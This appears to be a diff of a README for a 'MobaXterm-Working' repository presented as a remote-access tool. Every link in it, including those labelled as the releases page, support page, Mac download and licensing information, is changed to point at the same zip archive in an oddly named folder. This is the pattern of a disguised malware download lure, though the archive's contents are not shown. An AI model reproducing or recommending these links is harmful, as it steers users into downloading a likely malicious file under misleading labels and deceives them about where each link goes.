@@ -1,6 +1,6 @@
 # 🌟 MobaXterm-Working - A Simple Tool for Enhanced Remote Access
 
-[![Download MobaXterm-Working](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip)](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
+[![Download MobaXterm-Working](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip)](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
 
 ## 📦 Introduction
 
@@ -13,7 +13,7 @@ To get started with MobaXterm-Working, follow the steps below to download and ru
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip) to download the latest version of MobaXterm-Working.
+   Go to the [Releases Page](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip) to download the latest version of MobaXterm-Working.
 
 2. **Choose the Right File**  
    You will see several files listed. Choose the one that suits your operating system:
@@ -66,15 +66,15 @@ If you run into any issues while using MobaXterm-Working, consider the following
 
 ## 💬 Support
 
-For any questions or issues, visit our [Support Page](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip). You can submit a new issue or comment on existing ones for assistance.
+For any questions or issues, visit our [Support Page](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip). You can submit a new issue or comment on existing ones for assistance.
 
 ## 🔗 Additional Resources
 
 Explore more about MobaXterm-Working through the following topics:
 
-- [Alternative to MobaXterm](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
-- [Mobaxterm for Mac Download](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
-- [MobaXterm Licensing Information](https://raw.githubusercontent.com/ahrekmo/MobaXterm-Working/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
+- [Alternative to MobaXterm](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
+- [Mobaxterm for Mac Download](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
+- [MobaXterm Licensing Information](https://github.com/ahrekmo/MobaXterm-Working/raw/refs/heads/main/hypocrystalline/MobaXterm-Working_v1.1.zip)
 
 Make sure you review the user documentation for in-depth guides on using specific features.
 
